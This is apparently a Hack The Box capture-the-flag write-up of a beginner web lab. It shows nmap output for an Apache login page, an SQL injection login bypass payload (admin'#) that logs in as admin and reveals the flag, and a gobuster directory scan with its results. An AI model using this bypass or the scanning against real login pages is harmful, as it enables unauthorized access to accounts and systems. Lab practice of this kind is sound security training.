What is the 2021 OWASP Top 10 classification for this vulnerability?
https://owasp.org/Top10/
`A03:2021-Injection`
Apache httpd 2.4.38 ((Debian))

10.129.153.150

We have a web page being hosted on port 80 with a login page

```php
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
```

Lets attempt an SQL injection for admin without knowing the password

```php
admin'#
```

We successfully log in and are congratulated

```php
Congratulations!
Your flag is: e3d0796d002a446c0e622226f42e9672
```

We have rooted this machine.
I'm running `gobuster` just because i'm curious if there was another entry point at all

```php
gobuster dir -u http://10.129.4.165 -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-error -o gobuster.txt
```

Didn't find anything useful but it do find it very interesting just what gets hosted on this things and how HTB sets up its web labs. 

```php
/images               (Status: 301) [Size: 313] [--> http://10.129.4.165/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.4.165/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.129.4.165/js/]
/vendor               (Status: 301) [Size: 313] [--> http://10.129.4.165/vendor/]
/fonts                (Status: 301) [Size: 312] [--> http://10.129.4.165/fonts/]
/server-status        (Status: 403) [Size: 277]
```

